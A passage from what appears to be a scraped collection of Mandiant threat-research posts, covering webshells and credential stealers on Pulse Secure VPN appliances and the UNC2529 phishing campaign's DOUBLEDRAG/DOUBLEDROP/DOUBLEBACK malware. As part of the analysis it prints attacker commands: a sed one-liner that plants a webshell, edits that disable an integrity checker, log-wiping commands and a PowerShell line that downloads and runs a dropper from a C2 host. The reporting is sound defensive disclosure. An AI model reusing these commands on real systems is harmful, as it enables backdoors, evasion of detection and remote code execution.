| dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B34)) printf '\\xFF' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B35)) STEADYPULSE The file licenseserverproto.cgi (SHA256: 168976797d5af7071df257e91fcc31ce1d6e59c72ca9e2f50c8b5b3177ad83cc ) is a webshell implemented via modification of a legitimate Perl script used by a Pulse Secure tool which enables arbitrary command execution. The attacker inserted two blocks of Perl code that implement the webshell. The source code modifications are surrounded by comments that indicate the start and end of inserted code. The comment strings used are ##cgistart1 , ##cgiend1 , ##cgistart2 and ##cgiend2 . Although the exact purpose of these comment strings is unknown, the attacker may use them to facilitate updates to the malicious code or to allow for its quick removal if necessary. The Perl script enclosed in the tags ##cgistart1 and ##cgiend1 adds several lines to import Perl modules that are used by the webshell. It also adds a function to parse parameters of received command data. The script enclosed in the tags ##cgistart2 and ##cgiend2 is responsible for checking web requests designed to be executed by the webshell, if present. If no webshell request is found, the script passes execution to the legitimate Perl script for the webpage. The webshell portion of the script is invoked when it receives a form submission name=value pair of serverid matching a secret key. This causes the webshell to extract the string passed to it via the QUERY_STRING CGI environment variable. Individual key/value pairs delimited by the & character and are URL decoded. Although the script parses out all key/value pairs it receives, it specifically looks for and extracts data associated with the cmd parameter. If found, it will generate a form containing the extracted cmd to be executed and the previous serverid value along with a form submission button named Run . Upon submission, the webshell will execute the passed command on the victim host's command line and display the results to the attacker before exiting. If no cmd value was extracted, the webshell will simply output a </pre> HTML tag. PULSECHECK The file secid_canceltoken.cgi (SHA256: a1dcdf62aafc36dd8cf64774dea80d79fb4e24ba2a82adf4d944d9186acd1cc1 ) is a webshell written in Perl that enables arbitrary command execution. With a properly formatted request, the script will execute webshell code. Otherwise, the legitimate welcome page of the Pulse Secure VPN software is presumably invoked. The script checks for web requests using the HTTP POST method and, if found, will further check the HTTP request headers for the CGI environment variable HTTP_X_KEY . If this header matches a backdoor key, then the malware will output the result of the command sent in the variable HTTP_X_CMD . This data is RC4 encrypted and base64-encoded. The passphrase to decrypt is sent in the environment variable HTTP_X_CNT . The webshell will set the content type to Content-type:text/html and the command output printed. Following this, the script exits. QUIETPULSE The file dsserver (SHA256: 9f6ac39707822d243445e30d27b8404466aa69c61119d5308785bf4a464a9ebd ) is a legitimate Perl script with malicious modifications to fork the child process /home/bin/dshelper . The dshelper script does not exist on a clean PulseSecure installation, this file is described as QUIETPULSE Utility Script. QUIETPULSE Utility Script The file dshelper (SHA256: c774eca633136de35c9d2cd339a3b5d29f00f761657ea2aa438de4f33e4bbba4 ) is a shell script invoked by a malicious version of dsserver that primarily functions as a utility script responsible for copying files and executing commands. Like the ATRIUM patcher, this script accesses /tmp/data, a path which is used during a system upgrade. This file is therefore, like the ATRIUM patcher, used by the attacker to maintain persistence. The script is set to execute in a loop where four main checks are executed every two minutes. The checks are as follows: Check 1 If /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi exists and is non-empty then execute: grep -c -s 'system($depara)' /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi It checks if the file has the contents system($depara) . If the file does not contain this content, then retrieve the first line of the file by executing: sed -n 1p /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi Then copy a file via: cp /home/webserver/htdocs/dana-na/auth/compcheckjava.cgi /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi Then replace the copy’s first line with the one retrieved from the sed above via: sed -i 1c\"<varies>\" /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi Check 2 If /tmp/data/root/home/bin/ exists as a directory, then check if the file /tmp/data/root/home/bin/dshelper does not exist. If it does not exist, then place it there by copying a file via: cp -p /home/bin/dshelper /tmp/data/root/home/bin/ Check 3 If /tmp/data/root/home/bin/dsserver exists and is non-empty then execute the following to check if the file does not contain the string exec(\"/home/bin/dshelper\") : grep -c -s 'exec(\"/home/bin/dshelper\")' /tmp/data/root/home/bin/dsserver If it doesn't then execute to insert the line: sed -i 's/for (;;)/my $monpid = fork();\\nif ($monpid == 0) {\\nexec(\\\"\\/home\\/bin\\/dshelper\\\");\\n}\\n&/g' /tmp/data/root/home/bin/dsserver Check 4 If the file /tmp/data/root/home/bin/check_integrity.sh exists and is non-empty, then check if the file contains the string exit 1 by executing: grep -c -s 'exit 1' /tmp/data/root/home/bin/check_integrity.sh If the file does contain this content, then execute the following to switch the content to exit 0 : sed -i 's/exit 1/exit 0/g' /tmp/data/root/home/bin/check_integrity.sh PULSEJUMP The file with SHA256: 7fa71a7f76ef63465cfeacf58217e0b66fc71bc81d37c44380a6f572b8a3ec7a is a system information and credential harvesting Perl script. The sample writes information from multiple sources to the file /tmp/dsactiveuser.statementcounters in append mode. The sample begins by retrieving all auth servers via the API AuthAdmin::getAllAuthServers . and logs the results. Next, the sample logs all roles via the API DSRole::GeneralAdmin::getRoles and writes the values to the file. The sample may also retrieve and log additional information depending on the device configuration. HARDPULSE The file compcheckjava.cgi (SHA256: 1d3ab04e21cfd40aa8d4300a359a09e3b520d39b1496be1e4bc91ae1f6730ecc ) has the ability to read and write arbitrary files and may execute arbitrary commands depending on the implementation of a particular library function. The sample responds to HTTP GETs and PUTs. The GET path is not relevant, but the PUT path first checks if the incoming requests checkcode POST param is equal to a hardcoded passcode. If this check passes the sample inspects the param hashid to determine if it's non-empty. If non-empty the sample displays a prompt to the user that includes hardware information and then base64 decodes the param hashid and checks it against pulsesecure. If this matches a recoveryToken is generated which is the MD5 hash of 16 random bytes, with the result hash truncated to 8 characters. This token is then displayed to the user via the URL https://ive-host/dana-na/auth/recover[.]cgi?token=<varies> and the sample exits. If this check did not match then the sample passes the base64 decoded data to a routine DSSafe::psystem which may execute shell commands, however this implementation is not provided and is speculation. If the param hashid is empty the sample instead checks that the param m is non-empty. If so, it's matched against get and put which will read/write arbitrary files to the host, respectively. ATRIUM The file compcheckresult.cgi (SHA256: f2b1bd703c3eb05541ff84ec375573cbdc70309ccb82aac04b72db205d718e90 ) is a webshell capable of arbitrary command execution. The sample has malicious logic inserted at the end of legitimate logic. The malicious logic inspects all requests of any type looking for the HTTP query parameter id . If this query parameter exists, the sample executes it verbatim on using the system API. The sample does not encode or obfuscate the command in any way. If the query parameter is not found in the request, then the original legitimate logic is invoked. Persistence Patcher The file DSUpgrade.pm (SHA256: 224b7c45cf6fe4547d3ea66a12c30f3cb4c601b0a80744154697094e73dbd450 ) is a patcher utility script responsible for persisting webshells across a system upgrade. We’ve observed variants of this utility targeting the persistence of multiple webshell families, notably ATRIUM, STEADYPULSE, and PULSECHECK. Like previous patchers, this sample uses sed to insert malicious logic. The attacker likely chose DSUpgade.pm to host their patch logic as it is a core file in the system upgrade procedure, ensuring the patch is during updates. The patcher modifies content in /tmp/data as this directory holds the extracted upgrade image the newly upgraded system will boot into. This results in a persistence mechanism which allows the attacker to maintain access to the system across updates. my $cmd_x=\"sed -i '/echo_console \\\"Saving package\\\"/i( sed -i \\\\\\'/main();\\\\\\$/cif(CGI::param(\\\\\\\\\\\"id\\\\\\\\\\\")){ print \\\\\\\\\\\"Cache-Control: no-cache\\\\\\\\\\\\\\\\n\\\\\\\\\\\"; print \\\\\\\\\\\"Content-type: text/html\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n\\\\\\\\\\\"; my \\\\\\\\\\$na=CGI::param(\\\\\\\\\\\"id\\\\\\\\\\\"); system(\\\\\\\\\\\"\\\\\\\\\\$na\\\\\\\"); } else{ &main(); }\\\\\\' /tmp/data/root$cgi_p; cp -f /home/perl/DSUpgrade.pm /tmp/data/root/home/perl; cp -f /pkg/dspkginstall /tmp/data/root/pkg/; )'/pkg/do-install\"; The patcher also performs additional shell commands for unpacking a compressed package: system(\"/bin/mount -o remount,rw /dev/root /\"); system(\"/bin/tar\", \"-xzf\", \"/tmp/new-pack.tgz\", \"-C\", \"/tmp\",\"./installer\"); system(\"cp -f /tmp/installer/do-install /pkg/\"); system(\"cp -f /tmp/installer/VERSION /pkg/\"); system(\"cp -f /tmp/installer/sysboot-shlib /pkg/\"); system(\"cp -f /tmp/installer/losetup /pkg/\"); PACEMAKER The file memread (SHA256: 68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2 ) is a credential stealer. The sample has the usage information: Usage: memread [-t time(minute)] [-m size(MB)] [-s sleep_interval(second)] The sample starts by setting an alarm that kills the application after a configurable number of minutes, 14 by default. It then enters a loop which reads /proc/ entries every 2 seconds looking for a target application, this interval is also configurable. The target is found by opening /proc/<process_name>/cmdline for each entry in the folder and then reading this file looking for the string dswsd within the command line. Once found the target application's proc/<target_pid>/mem is opened, the process is attached to with PTRACE, then memory read in chunks up to 512 bytes in size. For each chunk, the string 20 30 20 0A 00 ( 0 \\n) is searched for as a needle. If found the sample splits the data by first space, then a dash -. Two dashes are expected to be found, and these are immediately converted into hex numbers, example form: -<number>. If the second number minus the first is > 8191 the sample reads the data starting at the file offset of the first number, up to a size specified by second number minus first number. Once the sample has read the process memory and found all memory data of interest the sample detaches PTRACE then the sample begins memory scanning the copied data. The sample tries to locate a sequence of 'flags' in memory one by one to locate what seem to be information the attacker wishes to steal. This information is not known, nor is the structure of it. The sequences scanned for generally have start and end scan sequences which in order scanned for, are: USER_START_FLAG: 3C 05 08 75 73 65 72 4E 61 6D 65 05 01 3E 05 00 USER_END_FLAG: 3C 2F 05 08 75 73 65 72 4E 61 6D 65 05 01 3E 00 PASSWORD_START_FLAG: 3C 05 08 70 61 73 73 77 6F 72 64 05 01 3E 00 PASSWORD_END_FLAG: 3C 2F 05 08 70 61 73 73 77 6F 72 64 05 01 3E 00 AUTHNUM_START_FLAG: 3C 05 0A 61 75 74 68 4E 75 6D 62 65 72 05 01 3E 00 AUTHNUM_END_FLAG: 3C 2F 05 0A 61 75 74 68 4E 75 6D 62 65 72 05 01 3E 00 If all these sequences are found, the data between the start and end is extracted and eventually formatted and written to the file /tmp/dsserver-check.statementcounters . The approximate format of this data is: Name:<username> || Pwd:<password> || AuthNum:<authnumber>\\n The sample replaces the following URL encoded values with their ascii representation for the password: &amp; ->  & &lt;  ->  < &gt;  ->  > PACEMAKER Launcher Utility As part of our investigation into PACEMAKER we were able to retrieve a simple bash script responsible for launching the credential stealer. The launcher script hash SHA256 4c5555955b2e6dc55f52b0c1a3326f3d07b325b112060329c503b294208960ec launches PACEMAKER from a hardcoded path with options specifying a 16MB memory read size and a memory scan interval of 2 seconds, with a variable self-kill time. #!/bin/bash /home/bin/memread -t $1 -m 16 -s 2 & THINBLOOD Log Wiper Utility The file dsclslog with SHA256 88170125598a4fb801102ad56494a773895059ac8550a983fdd2ef429653f079 is a log wiper utility. The sample provides the usage information: Usage: dsclslog -f [events|access] -r [Regex1,Regex2,Regex3,...] The –f flag specifies if the file log.events.vc0 or log.access.vc0 within the directory /home/runtime/logs should be modified. To perform its log cleaning operations the sample first makes two copies of whichever log file was chosen, but uses .vc1 and .vc2 as the extension for the new files. The file with the .vc1 is used to search for entries that match the given entries, and the file with the .vc2 extension is used as a temporary file where the cleaned log is written. After generating both files and log cleaning is finished the sample executes the following commands via the system API to overwrite the original log with the cleaned version, then removes the intermediate: mv /home/runtime/logs/log.<logtype>.vc2 /home/runtime/logs/log.<logtype>.vc0 rm /home/runtime/logs/log.<logtype>.vc1 THINBLOOD LogWiper Utility Variant The file clear_log.sh (SHA256: 1741dc0a491fcc8d078220ac9628152668d3370b92a8eae258e34ba28c6473b9 ) is a BASH script responsible for zeroing log lines that match a given regex pattern. The sample is similar to the compiled THINBLOOD Log Wiper but edits logs in-place with sed rather than making temporary copies. The sed commands used are: sed -i \"s/.\\x00[^\\x00]*<regex_string>[^\\x00]*\\x09.\\x00//g\" /data/runtime/logs/<logfile> sed -i \"s/\\x<hex_char>\\x00[^\\x00]*$2[^\\x00]*\\x09\\x<hex_char>\\x00//g\" /data/runtime/logs/<logfile> The sample embeds the usage information: usage: /home/bin/bash clear_log.sh [logfile] [keyword(regex)] LOCKPICK The file libcrypto.so (SHA256: 2610d0372e0e107053bc001d278ef71f08562e5610691f18b978123c499a74d8 ) is a shared object containing cryptographic logic from openssl. The sample contains a modification to the routine bnrand_range that breaks the security of the random numbers generated. There are three paths in this routine for generating a random big number between a given range. The first case is unmodified and generates a zeroed big number, the other two cases are patched so that a constant value overwrites the generated random value and always returns success. This breaks the random number generation by replacing it with a value the attacker knows in all cases. LOCKPICK Patcher The file with the hash b990f79ce80c24625c97810cb8f161eafdcb10f1b8d9d538df4ca9be387c35e4 is a patcher utility responsible for inserting the malicious logic known as LOCKPICK. The patcher starts by running sed on the integrity checker script built into the appliance to insert an early exit routine. This is inserted by the command sed -i '12aexit 0' /home/bin/check_integrity.sh which when applied causes this script to exit without performing its intended checks. After this the sample uses python file read/write APIs to insert long strings of assembly that represent the logic known as LOCKPICK. This file is different from the other patchers we’ve identified in that it is python and specifically targets system integrity routines. Detecting the Techniques The following table contains specific FireEye product detection names for the malware families associated with the exploitation of Pulse Secure VPN device. Platform(s) Detection Name Network Security Email Security Detection On Demand Malware File Scanning Malware File Storage Scanning FE_APT_Webshell_PL_HARDPULSE_1 FEC_APT_Webshell_PL_HARDPULSE_1 APT.Webshell.PL.HARDPULSE FE_APT_Trojan_PL_PULSEJUMP_1 FEC_APT_Trojan_PL_PULSEJUMP_1 FE_Trojan_PL_Generic_1 FE_APT_Trojan_PL_RADIALPULSE_1 FEC_APT_Trojan_PL_RADIALPULSE_1 FE_APT_Trojan_PL_RADIALPULSE_2 FE_APT_Trojan_PL_RADIALPULSE_3 FEC_APT_Trojan_PL_RADIALPULSE_2 FE_APT_Trojan_PL_RADIALPULSE_4 FEC_APT_Trojan_PL_RADIALPULSE_3 FE_APT_Trojan_PL_RADIALPULSE_5 FE_APT_Tool_SH_RADIALPULSE_1 FEC_APT_Tool_SH_RADIALPULSE_1 FE_APT_Trojan_Linux32_PACEMAKER_1 FE_APT_Trojan_Linux_PACEMAKER_1 FE_APT_Backdoor_Linux32_SLOWPULSE_1 FE_APT_Backdoor_Linux32_SLOWPULSE_2 FE_APT_Trojan_Linux32_SLOWPULSE_1 FE_APT_Tool_Linux32_SLOWPULSE_1 FE_APT_Webshell_PL_STEADYPULSE_1 FEC_APT_Webshell_PL_STEADYPULSE_1 APT.Webshell.PL.STEADYPULSE FE_APT_Trojan_Linux32_LOCKPICK_1 FE_Webshell_PL_ATRIUM_1 FEC_Webshell_PL_ATRIUM_1 FE_Trojan_SH_ATRIUM_1 FE_APT_Webshell_PL_SLIGHTPULSE_1 FEC_APT_Webshell_PL_SLIGHTPULSE_1 APT.Webshell.PL.SLIGHTPULSE FE_APT_Webshell_PL_PULSECHECK_1 FEC_APT_Webshell_PL_PULSECHECK_1 FE_APT_Tool_Linux32_THINBLOOD_1 FE_APT_Tool_Linux_THINBLOOD_1 FE_APT_Tool_SH_THINBLOOD_1 FEC_APT_Tool_SH_THINBLOOD_1 APT.Tool.Linux.THINBLOOD.MVX FE_APT_Trojan_PL_QUIETPULSE_1 FEC_APT_Trojan_PL_QUIETPULSE_1 FE_Trojan_SH_Generic_2 FEC_Trojan_SH_Generic_3 Suspicious Pulse Secure HTTP request (IPS) Endpoint Security Real-Time (IOC) SLOWPULSE (BACKDOOR) PACEMAKER (LAUNCHER) THINBLOOD (UTILITY) Helix VPN ANALYTICS [Abnormal Logon] EXPLOIT - SONICWALL ES [CVE-2021-20021 Attempt] EXPLOIT - SONICWALL ES [CVE-2021-20021 Success] EXPLOIT - SONICWALL ES [CVE-2021-20023 Attempt] EXPLOIT - SONICWALL ES [CVE-2021-20023 Success] Mandiant Security Validation Actions Organizations can validate their security controls using the following actions with Mandiant Security Validation . VID Title A101-596 Malicious File Transfer - SLOWPULSE, Download, Variant #1 A101-597 Malicious File Transfer - SLOWPULSE, Download, Variant #2 A101-598 Malicious File Transfer - SLOWPULSE, Download, Variant #3 A101-599 Malicious File Transfer - SLOWPULSE, Download, Variant #4 A101-600 Malicious File Transfer - SLOWPULSE, Download, Variant #5 A101-601 Malicious File Transfer - SLOWPULSE, Download, Variant #6 A101-602 Malicious File Transfer - SLOWPULSE, Download, Variant #7 A101-604 Malicious File Transfer - Pulse Secure Vulnerability, Utility, Download, Variant #1 A101-605 Malicious File Transfer - RADIALPULSE, Download, Variant #1 A101-606 Malicious File Transfer - PULSEJUMP, Download, Variant #1 A101-607 Malicious File Transfer - HARDPULSE, Download, Variant #1 A101-608 Malicious File Transfer - SLIGHTPULSE, Download, Variant #1 A101-609 Malicious File Transfer - LOCKPICK, Patcher, Download, Variant #1 A101-610 Malicious File Transfer - LOCKPICK, Download, Variant #1 A101-611 Malicious File Transfer - ATRIUM, Patcher, Download, Variant #1 A101-612 Malicious File Transfer - PACEMAKER, Launcher, Download, Variant #1 A101-613 Malicious File Transfer - PACEMAKER, Download, Variant #1 A101-614 Malicious File Transfer - QUIETPULSE Utility, Download, Variant #1 A101-615 Malicious File Transfer - QUIETPULSE, Download, Variant #1 A101-616 Malicious File Transfer - STEADYPULSE, Download, Variant #2 A101-617 Malicious File Transfer - STEADYPULSE, Download, Variant #1 A101-618 Malicious File Transfer - ATRIUM, Download, Variant #1 A101-619 Malicious File Transfer - THINBLOOD, Download, Variant #1 A101-620 Malicious File Transfer - THINBLOOD, Download, Variant #2 A101-621 Malicious File Transfer - PULSECHECK, Download, Variant #1 A101-622 Malicious File Transfer - PULSECHECK, Download, Variant #2 A104-757 Host CLI - QUIETPULSE Utility, Check, Variant #1 A104-758 Host CLI - QUIETPULSE Utility, Check, Variant #2 A104-759 Host CLI - QUIETPULSE Utility, Check, Variant #3 A104-760 Host CLI - QUIETPULSE Utility, Check, Variant #4 Acknowledgements Mandiant would like to thank the Stroz Friedberg DFIR and Security Testing teams for their collaboration with the analysis and research. The team would also like to thank Joshua Villanueva, Regina Elwell, Jonathan Lepore, Dimiter Andonov, Josh Triplett, Jacob Thompson and Michael Dockry for their hard work in analysis and blog content. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/05/unc2529-triple-double-trifecta-phishing-campaign.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-05-04",
                    "source": "www.fireeye.com"
                },
                "text": "In December 2020, Mandiant observed a widespread, global phishing campaign targeting numerous organizations across an array of industries. Mandiant tracks this threat actor as UNC2529 . Based on the considerable infrastructure employed, tailored phishing lures and the professionally coded sophistication of the malware, this threat actor appears experienced and well resourced. This blog post will discuss the phishing campaign, identification of three new malware families, DOUBLEDRAG, DOUBLEDROP and DOUBLEBACK, provide a deep dive into their functionality, present an overview of the actor’s modus operandi and our conclusions. A future blog post will focus on the backdoor communications and the differences between DOUBLEBACK samples to highlight the malware evolution. UNC2529 Phishing Overview Mandiant observed the first wave of the phishing campaign occur on Dec. 2, 2020, and a second wave between Dec. 11 and Dec. 18, 2020. During the initial flurry, Mandiant observed evidence that 28 organizations were sent phishing emails, though targeting was likely broader than directly observed. These emails were sent using 26 unique email addresses associated with the domain tigertigerbeads<.>com, and in only a small number of cases did we see the same address used across multiple recipient organizations. These phishing emails contained inline links to malicious URLs such as, hxxp://totallyhealth-wealth[.]com/downld-id_mw<redacted>Gdczs, engineered to entice the victim to download a file. UNC2529 employed at least 24 different domains to support this first, of a three-stage process. The structure of URLs embedded in these phishing emails had the following patterns, where the string was an alphabetic variable of unknown function. http://<fqdn>/downld-id_<string> http://<fqdn>/downld-id-<string> http://<fqdn>/files-upload_<string> http://<fqdn>/files-upload-<string> http://<fqdn>/get_file-id_<string> http://<fqdn>/get_file-id-<string> http://<fqdn>/zip_download_<string> http://<fqdn>/zip_download-<string> The first stage payload downloaded from these URLs consisted of a Zip compressed file containing a corrupt decoy PDF document and a heavily obfuscated JavaScript downloader. Mandiant tracks the downloader as DOUBLEDRAG. Interestingly, the PDF documents were obtained from public websites, but corrupted by removing bytes to render them unreadable with a standard PDF viewer. It is speculated that the victim would then attempt to launch the JavaScript (.js) file, which can be executed natively with Windows Script Host by simply double clicking on the file. All but one of the file name patterns for the ZIP, PDF and JS files were document_<state>_client-id_<4 digit number>.extension, such as “document_Ohio_client-id_8902.zip”. Each of the observed DOUBLEDRAG downloaders used in the first wave attempted to download a second-stage memory-only dropper, which Mandiant tracks as DOUBLEDROP, from either hxxp://p-leh[.]com/update_java.dat or hxxp://clanvisits[.]com/mini.dat. The downloaded file is a heavily obfuscated PowerShell script that will launch a backdoor into memory. Mandiant tracks this third-stage backdoor as DOUBLEBACK. DOUBLEBACK samples observed during the phishing campaign beaconed to hxxps://klikbets[.]net/admin/client.php and hxxps://lasartoria[.]net/admin/client.php. Prior to the second wave, observed between Dec. 11 and Dec. 18, 2020, UNC2529 hijacked a legitimate domain owned by a U.S. heating and cooling services company, modified DNS entries and leveraged that infrastructure to phish at least 22 organizations, five of which were also targeted in the first wave. It is not currently known how the legitimate domain was compromised. The threat actor used 20 newly observed domains to host the second-stage payload. The threat actor made slight modifications to the URL pattern during the second wave. http://<fqdn>/<string> http://<fqdn>/dowld_<string> http://<fqdn>/download_<string> http://<fqdn>/files_<string> http://<fqdn>/id_<string> http://<fqdn>/upld_<string> Of note, the DOUBLEDRAG downloader observed in the first wave was replaced with a Microsoft Excel document containing an embedded legacy Excel 4.0 (XLM) macro in Excel 97-Excel 2003 Binary file format (BIFF8). When the file was opened and the macro executed successfully, it would attempt to download a second-stage payload from hxxps://towncentrehotels[.]com/ps1.dat. The core functionality of the DOUBLEDRAG JavaScript file and the BIFF8 macro is to download a file from a hardcoded URL. This Excel file was also found within Zip files, as seen in the first wave, although only one of the observed Zip files included a corresponding corrupt decoy PDF document. Additional DOUBLEBACK samples were extracted from DOUBLEDROP samples uploaded to a public malware repository, which revealed additional command and control servers (C2), hxxps://barrel1999[.]com/admin4/client.php, hxxps://widestaticsinfo[.]com/admin4/client.php, hxxps://secureinternet20[.]com/admin5/client.php, and hxxps://adsinfocoast[.]com/admin5/client.php. Three of these domains were registered after the observed second wave. Tailored Targeting UNC2529 displayed indications of target research based on their selection of sender email addresses and subject lines which were tailored to their intended victims. For example, UNC2529 used a unique username, masquerading as an account executive for a small California-based electronics manufacturing company, which Mandiant identified through a simple Internet search. The username of the email address was associated with both sender domains, tigertigerbeads<.>com and the compromised HVAC company. Masquerading as the account executive, seven phishing emails were observed targeting the medical industry, high-tech electronics, automotive and military equipment manufacturers, and a cleared defense contractor with subject lines very specific to the products of the California-based electronics manufacturing company. Another example is a freight / transport company that received a phish with subject, “compton ca to flowery branch ga”, while a firm that recruits and places long-haul truck drivers received a simple, “driver” in the subject line. A utility company received a phish with subject, “easement to bore to our stairwell area.” While not all financial institutions saw seemingly tailored subjects, numerous appeared fairly unique, as shown in Table 1. Subject Lure Wave re: <redacted> outdoors environment (1 out of 3) 1st accepted: follow up with butch & karen 1st re: appraisal for <redacted> - smysor rd 2nd re: <redacted> financing 2nd Table 1: Sample financial industry subject lures Several insurance companies that were targeted saw less specific subjects, but still appropriate for the industry, such as those in Table 2. Subject Lure Wave fw: certificate of insurance 1st fw: insurance for plow 1st please get this information 1st question & number request 1st claim status 2nd applications for medicare supplement & part d 2nd Table 2: Sample insurance industry subject lures Interestingly, one insurance company with offices in eastern Texas received a phish with a subject related to a local water authority and an ongoing water project. While no public information was found to tie the company to the other organization or project, the subject appeared to be very customized. Some patterns were observed, as seen in Table 3. Additionally, UNC2529 targeted the same IT services organization in both waves using the same lure (1 and 5 in Table 3). Most of the phishing emails with lures containing “worker” targeted U.S. organizations. As “worker” isn’t a common way to refer to an employee in the U.S., this may indicate a non-native American English speaker. Subject Lure Wave dear worker, your work # ujcb0utczl 1st good day worker, your job number- 8ldbsq6ikd 1st hello worker, your work number- u39hbutlsf 1st good day candidate, your vacancy # xcmxydis4s 2nd dear worker, your work # ujcb0utczl 2nd Table 3: Sample pattern subject lures Industry and Regional Targeting UNC2529’s phishing campaign was both global and impacted an array of industries (Industry and Regional Targeting graphics are greater than 100% due to rounding). While acknowledging some telemetry bias, in both waves the U.S. was the primary target, while targeting of EMEA and Asia and Australia were evenly dispersed in the first wave, as shown in Figure 1. Figure 1: UNC2529 phishing campaign, first wave In the second wave, EMEA’s percentage increased the most, while the U.S. dropped slightly, and Asia and Australia remained at close to the same level, as illustrated in Figure 2. Figure 2: UNC2529 phishing campaign, second wave Although Mandiant has no evidence about the objectives of this threat actor, their broad targeting across industries and geographies is consistent with a targeting calculus most commonly seen among financially motivated groups. Technical Analysis Overview The Triple DOUBLE malware ecosystem consists of a downloader (DOUBLEDRAG) (or alternatively an Excel document with an embedded macro), a dropper (DOUBLEDROP), and a backdoor (DOUBLEBACK). As described in the previous section, the initial infection vector starts with phishing emails that contain a link to download a malicious payload that contains an obfuscated JavaScript downloader. Once executed, DOUBLEDRAG reaches out to its C2 server and downloads a memory-only dropper. The dropper, DOUBLEDROP, is implemented as a PowerShell script that contains both 32-bit and 64-bit instances of the backdoor DOUBLEBACK. The dropper performs the initial setup that establishes the backdoor’s persistence on the compromised system and proceeds by injecting the backdoor into its own process (PowerShell.exe) and then executing it. The backdoor, once it has the execution control, loads its plugins and then enters a communication loop, fetching commands from its C2 server and dispatching them. One interesting fact about the whole ecosystem is that only the downloader exists in the file system. The rest of the components are serialized in the registry database, which makes their detection somewhat harder, especially by file-based antivirus engines. Ecosystem in Details DOUBLEDRAG Downloader component The downloader is implemented as a heavily obfuscated JavaScript code. Despite the relatively large amount of the code, it boils down to the following snippet of code (Figure 3), after de-obfuscation. \"C:\\Windows\\System32\\cmd.exe\" /c oqaVepEgTmHfPyC & Po^wEr^sh^elL -nop -w hidden -ep bypass -enc <base64_encoded_ps_code> Figure 3: De-obfuscated JavaScript downloader The <base64_encoded_ps_code> downloads and executes a PowerShell script that implements the DOUBLEDROP dropper. Note, that the downloaded dropper does not touch the file system and it is executed directly from memory. A sanitized version of the code, observed in the first phishing wave, is shown in Figure 4. IEX (New-Object Net.Webclient).downloadstring(\"hxxp://p-leh[.]com/update_java.dat\") Figure 4: Downloading and executing of the DOUBLEDROP dropper DOUBLEDROP Dropper component Overview The dropper component is implemented as an obfuscated in-memory dropper written in PowerShell. Two payloads are embedded in the script—the same instances of the DOUBLEBACK backdoor compiled for 32 and 64-bit architectures. The dropper saves the encrypted payload along with the information related to its decryption and execution in the compromised system’s registry database, effectively achieving a file-less malware execution. Setup The dropper's main goal is to serialize the chosen payload along with the loading scripts into the compromised system's registry database and to ensure that the payload will be loaded following a reboot or a user login (see the Persistence Mechanism section). In order to do so, the dropper generates three pseudo-random GUIDs and creates the registry keys and values shown in Figure 5. * HK[CU|LM]\\Software\\Classes\\CLSID\\{<rnd_guid_0>} * key: LocalServer * value: <default> * data: <bootstrap_ps_code> * key: ProgID * value: <default> * data: <rnd_guid_1> * value: <last_4_chars_of_rnd_guid_0> * data: <encoded_loader> * key: VersionIndependentProgID * value: <default> * data: <rnd_guid_1> * value: <first_4_chars_of_rnd_guid_0> * data: <encoded_rc4_key> * value: <last_4_chars_of_rnd_guid_0> * data: <rc4_encrypted_payload> * HK[CU|LM]\\Software\\Classes\\{<rnd_guid_1>} * value: <default> * data: <rnd_guid_1> * key: CLSID * value: <default> * data: <rnd_guid_0> * HK[CU|LM]\\Software\\Classes\\CLSID\\{<rnd_guid_2>} * value: <default> * data: <rnd_guid_1> * key: TreatAs * value: <default> * data: <rnd_guid_0> Figure 5: Registry keys and values created by the dropper Once the registry keys and values are created, the dropper dynamically generates the bootstrap and the launcher PowerShell scripts and saves them under the {<rnd_guid_0>} registry key as shown in Figure 5. Additionally, at this point the dropper generates a random RC4 key and encodes it inside a larger buffer which is then saved under the VersionIndependentProgID key. The actual RC4 key within the buffer is given by the following calculations, shown in Figure 6 (note that the key is reversed!). <relative_offset> = buffer[32] buffer[32 + <relative_offset> + 1] = <reversed_rc4_key> Figure 6: Encoding of the RC4 key Finally, the dropper encrypts the payload using the generated RC4 key and saves it in the respective value under the VersionIndependentProgId registry key (see Figure 5). At this point all the necessary steps that ensure the payload's persistence on the system are complete and the dropper proceeds by directly executing the launcher script, so the backdoor receives the execution control immediately. The persistence mechanism, the bootstrap, and the launcher are described in more details in the following sections. Persistence Mechanism The persistence mechanism implemented by the DOUBLEDROP sample is slightly different depending on whether the dropper has been started within an elevated PowerShell process or not. If the dropper was executed within an elevated PowerShell process, it creates a scheduled task with an action specified as TASK_ACTION_COM_HANDLER and the class ID - the {<rnd_guid_2>} GUID (See Figure 5). Once executed by the system, the task finds the {<rnd_guid_2>} class under the HKLM\\Software\\Classes\\CLSID registry path, which in this case points to an emulator class via the TreatAs registry key. The {<rnd_guid_0>} emulator class ID defines a registry key LocalServer and its default value will be executed by the task. If the dropper is started within a non-elevated PowerShell process, the sequence is generally the same but instead of a task, the malware hijacks one of the well-known classes, Microsoft PlaySoundService ({2DEA658F-54C1- 4227-AF9B-260AB5FC3543}) or MsCtfMonitor ({01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}), by creating an associated TreatAs registry key under their definition in the registry database. The TreatAs key's default registry value points to the {<rnd_guid_0>} emulator class essentially achieving the same execution sequence as in the elevated privilege case. Bootstrap The bootstrap is implemented as an obfuscated PowerShell script, generated dynamically by the dropper. The content of the code is saved under the emulator's class LocalServer registry key and it is either executed by a dedicated task in case of a privileged PowerShell process or by the operating system that attempts to load the emulator for the PlaySoundService or MsCtfMonitor classes. The bootstrap code finds the location of the launcher script, decodes it and then executes it within the same PowerShell process. A decoded and sanitized version of the script is shown in Figure 7. $enc = [System.Text.Encoding]::UTF8; $loader = Get-ItemProperty -Path($enc.GetString([Convert]::FromBase64String('<base64_encoded_path_to_launcher>'))) -n '<launcher_reg_val>' | Select-Object 